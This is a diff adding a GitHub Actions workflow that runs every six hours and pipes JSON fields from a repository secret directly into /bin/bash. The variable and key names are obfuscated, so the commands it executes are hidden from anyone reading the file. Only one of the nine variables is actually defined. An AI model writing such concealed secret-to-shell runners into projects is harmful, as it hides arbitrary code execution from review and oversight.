@@ -1,0 +1,26 @@
+name: kumaozhongqin
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kumaozhongqin
+        env:
+          gywy640: ${{ secrets.gywy640 }}
+        run: |
+          echo $gywy640 | jq -r .g76514 | /bin/bash
+          echo $jafy47 | jq -r .pcoua10 | /bin/bash
+          echo $au81597 | jq -r .zzzz8814 | /bin/bash
+          echo $ub653 | jq -r .wyzgk4 | /bin/bash
+          echo $t214 | jq -r .gps513 | /bin/bash
+          echo $x69945 | jq -r .o36 | /bin/bash
+          echo $r56 | jq -r .ftvtk994 | /bin/bash
+          echo $rcv4 | jq -r .ozd099 | /bin/bash
+          echo $e67043 | jq -r .jimm3 | /bin/bash
+
